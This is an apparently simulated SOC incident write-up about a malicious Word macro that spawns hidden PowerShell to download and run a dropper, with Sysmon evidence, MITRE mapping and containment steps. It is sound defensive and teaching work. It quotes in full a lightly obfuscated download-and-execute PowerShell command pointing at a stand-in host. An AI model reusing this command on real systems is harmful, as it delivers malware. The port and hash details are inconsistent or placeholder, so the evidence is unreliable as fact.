# Security Investigation: Suspicious PowerShell Execution via MS Word
# (True Positive - Initial Access & Execution)

![Windows Security Logs](https://img.shields.io/badge/Windows%20Security%20Logs-0078D6?style=flat-square&logo=windows&logoColor=white)
![Sysmon](https://img.shields.io/badge/Sysmon%20Telemetry-4B275F?style=flat-square&logo=sysinternals&logoColor=white)
![VirusTotal](https://img.shields.io/badge/VirusTotal-394EFF?style=flat-square&logo=virustotal&logoColor=white)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT&CK%C2%AE-FF6600?style=flat-square)
![Network Connections](https://img.shields.io/badge/Network%20(Event%20ID%203)-FF3333?style=flat-square)
![True Positive](https://img.shields.io/badge/Verdict-True%20Positive-E50000?style=flat-square)

---

## 📌 Executive Summary
During routine monitoring, an alert triggered for suspicious PowerShell execution spawned by Microsoft Word on endpoint `Azul_Fifty`. The command-line arguments included execution policy bypass and hidden window flags (`-NoP -ep bypass -w hidden`). 

A structured triage confirmed this as a True Positive. The user interacted with a malicious document (`invoice_Q3_overdue.docm`), which executed a macro to download and drop a secondary payload (`update.exe`) from an external, untrusted IP address. The endpoint was immediately isolated from the network to prevent lateral movement, and the incident was escalated to Tier 2 / Incident Response.

Verdict: True Positive
Impact: High (Malware execution and C2 connection)
Action: Endpoint isolated, user credentials reset, and ticket escalated to IR team.

---

## 🔻 Incident Summary
This investigation documents the triage of a severe alert indicating "Office Application Spawning Command Shell/PowerShell". The endpoint generated a Sysmon Event ID 1 (Process Creation) showing `WINWORD.EXE` as the parent process to `powershell.exe`.

Forensic correlation across Sysmon telemetry confirmed a malicious sequence:
1. **Execution:** `WINWORD.EXE` spawned PowerShell with obfuscated/suspicious arguments.
2. **Network Connection:** `powershell.exe` initiated an outbound connection over port 443 to a known malicious IP (Sysmon Event ID 3).
3. **File Creation:** A suspicious executable (`update.exe`) was dropped into the user's `AppData\Local\Temp` directory (Sysmon Event ID 11).

The dropped binary was hashed and submitted to VirusTotal, returning a high detection rate (56/71) identifying it as a generic Trojan/Dropper.

Conclusion: The activity is a True Positive indicating a successful phishing compromise and payload execution.

---

## 🔻 Alert Context & Initial Hypothesis
During routine log review on the endpoint `Azul_Fifty`, a high-severity SIEM alert was generated: **Office Application Spawning PowerShell**.

*   **Initial Threat Hypothesis:** A user opened a malicious spear-phishing attachment containing macros, initiating a "Living off the Land" (LotL) attack using native Windows binaries (PowerShell) to download malware.

**MITRE ATT&CK**: 
* T1566.001 - Phishing: Spearphishing Attachment
* T1059.001 - Command and Scripting Interpreter: PowerShell

---

## 🔻 Triage & Evidence Analysis

Following a standard 3-step triage methodology:

### 1. The Caller (Who is executing?)
*   **User:** `Azul_Fifty\magda`
*   **Assessment:** Standard domain user. The execution is happening in the context of the user, typical of phishing payloads.

### 2. The Process (What is executing?)
*   **Parent Process:** `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`
*   **Child Process:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
*   **Command Line:** `p0wershell.exe -NoP -ep bypass -w hidden -Command "(New-Object N3t.WebClient).D0wnloadFile('http://192.168.1.100/payload.exe', 'C:\Users\magda\AppData\Local\Temp\update.exe'); Start-Process 'C:\Users\magda\AppData\Local\Temp\update.exe'"`
*   **Assessment:** Highly Malicious. Word should not spawn PowerShell to bypass execution policies, hide the window, and download files from the internet.

### 3. The Target (What happened next?)
*   **Target Activity:** Outbound network connection (Event ID 3) and File creation (Event ID 11).
*   **Assessment:** Malicious. The script successfully downloaded and saved an executable masquerading as an "update".

---

## 🔻 Evidence Collection & Cross-Correlation

### 🔻 Sysmon Evidence: Process Creation (Event ID 1)
Identified the initial malicious execution chain.

- 🔻**Image:** `powershell.exe`

- 🔻**Parent Image:** `WINWORD.EXE`

- 🔻**CommandLine:** `p0wershell.exe -NoP -ep bypass -w hidden -Command...`

### 🔻 Sysmon Evidence: Network Connection (Event ID 3)
Confirmed the payload download attempt.

- **Image:** `powershell.exe`

- **Destination IP:** `192.168.1.100` (Simulated C2 / Threat Actor Infrastructure)

- **Destination Port:** `80` (HTTP)

### 🔻 Sysmon Evidence: File Creation (Event ID 11) & Hash Validation
Confirmed the payload was successfully dropped onto the disk.
- **TargetFilename:** `C:\Users\magda\AppData\Local\Temp\update.exe`
- **SHA256:** `[Insert Malicious Hash Here]`

> The SHA256 hash of `update.exe` was submitted to VirusTotal, returning **56/71 detections**, confirming it as a malicious Trojan.



---

## 🔻 MITRE Mapping (Malicious)

| Behaviour | MITRE Technique | Reason |
| --- | --- | --- |
| Malicious Word Document | **T1566.001 – Spearphishing Attachment** | Delivery mechanism via malicious macro |
| Word spawning PowerShell | **T1059.001 – PowerShell** | Execution of malicious commands via LotL binaries |
| Payload downloaded via HTTP | **T1105 – Ingress Tool Transfer** | Downloading secondary payload from external server |
| File saved as `update.exe` | **T1036.005 – Masquerading: Match Legitimate Name or Location** | Attempting to hide malicious binary as a system update |

---
## 🔻 Flow Diagram (ASCII)
```Code
                 ┌──────────────────────────┐
                 │  Alert: Word spawning    │
                 │  PowerShell              │
                 └──────────────┬───────────┘
                                │
                                ▼
                 ┌──────────────────────────┐
                 │ Process: WINWORD.EXE     │
                 │ CMD: -ep bypass -w hidden│
                 │ → HIGHLY SUSPICIOUS      │
                 └──────────────┬───────────┘
                                │
                                ▼
                 ┌──────────────────────────┐
                 │ Sysmon Event ID 3        │
                 │ → Outbound HTTP to C2    │
                 └──────────────┬───────────┘
                                │
                                ▼
                 ┌──────────────────────────┐
                 │ Sysmon Event ID 11       │
                 │ → Drops 'update.exe'     │
                 └──────────────┬───────────┘
                                │
                                ▼
                 ┌──────────────────────────┐
                 │ VirusTotal Validation    │
                 │ → 56/71 Detections (RED) │
                 └──────────────┬───────────┘
                                │
                                ▼
                 ┌──────────────────────────┐
                 │ Verdict: TRUE POSITIVE   │
                 │ ACTION: ISOLATE HOST     │
                 └──────────────────────────┘
```

## 🔻 Resolution & Recommendations
- 🔻 Verdict: True Positive.

- 🔻 Action Taken:

    Endpoint Azul_Fifty was immediately isolated via EDR network containment to prevent lateral movement.

    The user magda was forced to change their Active Directory password and MFA tokens were revoked.

    The malicious IP and file hash were added to the enterprise blocklist (Firewall/AV).

- 🔻 Escalation: 

    Ticket assigned to Tier 2 / Incident Response for deep forensic memory analysis and to confirm if any data exfiltration occurred prior to containment.

## 🔻 Author
Magda Dominguez

SOC Analyst (L1-ready) Bristol, UK

Focused on Blue Team operations, detection engineering and log analysis.